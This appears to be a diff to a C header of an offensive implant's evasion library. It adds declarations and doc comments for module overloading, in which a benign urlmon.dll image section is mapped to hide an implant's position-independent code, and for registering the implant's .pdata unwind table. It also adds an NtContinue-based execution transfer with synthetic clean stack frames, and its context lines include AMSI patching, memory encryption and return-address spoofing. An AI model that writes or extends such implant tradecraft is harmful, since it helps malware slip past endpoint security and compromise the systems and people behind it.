@@ -138,6 +138,8 @@ typedef struct _EVASION_CONTEXT {
     PVOID          amsi_patch_addr; /* Address of patched AMSI function   */
     DWORD          prng_state;      /* PRNG state for frame randomization */
     MEMGUARD_STATE memguard;        /* Memory guard state                 */
+    PVOID          pdata_table;     /* Registered RUNTIME_FUNCTION array  */
+    DWORD          pdata_count;     /* Number of .pdata entries           */
 } EVASION_CONTEXT;
 
 /* ------------------------------------------------------------------ */
@@ -264,6 +266,41 @@ NTSTATUS memguard_decrypt(EVASION_CONTEXT *ctx);
  * a legitimate return address.
  */
 NTSTATUS memguard_setup_return_spoof(EVASION_CONTEXT *ctx);
+
+/* ------------------------------------------------------------------ */
+/*  Module overloading API                                             */
+/* ------------------------------------------------------------------ */
+
+/**
+ * Overload a benign DLL (urlmon.dll) via NtCreateSection(SEC_IMAGE).
+ * Returns the mapped base address of the sacrificial image section.
+ * The caller can then copy the implant PIC blob into this region.
+ */
+NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
+                                  PSIZE_T mapped_size);
+
+/* ------------------------------------------------------------------ */
+/*  .pdata registration API                                            */
+/* ------------------------------------------------------------------ */
+
+/**
+ * Register the implant's RUNTIME_FUNCTION table via RtlAddFunctionTable
+ * so that the Windows exception dispatcher can unwind through implant
+ * frames.  Requires linker symbols __pdata_start / __pdata_end.
+ */
+NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base);
+
+/* ------------------------------------------------------------------ */
+/*  NtContinue entry transfer API                                      */
+/* ------------------------------------------------------------------ */
+
+/**
+ * Transfer execution to a target function using NtContinue with a
+ * synthetic CONTEXT64 and clean stack frames.  This function does
+ * not return — control is transferred directly via the kernel.
+ */
+NTSTATUS evasion_ntcontinue_transfer(EVASION_CONTEXT *ctx,
+                                      PVOID target_func, PVOID param);
 
 /* ------------------------------------------------------------------ */
 /*  Test support                                                       */
